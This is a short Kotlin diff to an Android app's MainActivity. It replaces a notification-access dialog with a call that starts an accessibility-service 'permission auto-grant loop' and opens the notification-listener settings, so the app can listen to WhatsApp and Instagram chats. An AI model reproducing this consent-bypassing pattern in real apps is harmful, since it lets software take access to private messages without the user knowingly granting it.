@@ -648,8 +648,16 @@ class MainActivity : AppCompatActivity() {
 
         // Step 2: Notification Access (WhatsApp & Instagram chat listener)
         if (!isNotificationAccessGranted() && !skipNotificationStep) {
-            showNotificationDialog()
-            return
+            if (isAccessibilityEnabled()) {
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                try {
+                    val notifIntent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                    notificationListenerLauncher.launch(notifIntent)
+                    return
+                } catch (e: Exception) {
+                    Log.e(TAG, "Cannot launch notification listener settings directly", e)
+                }
+            }
         }
 
         // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
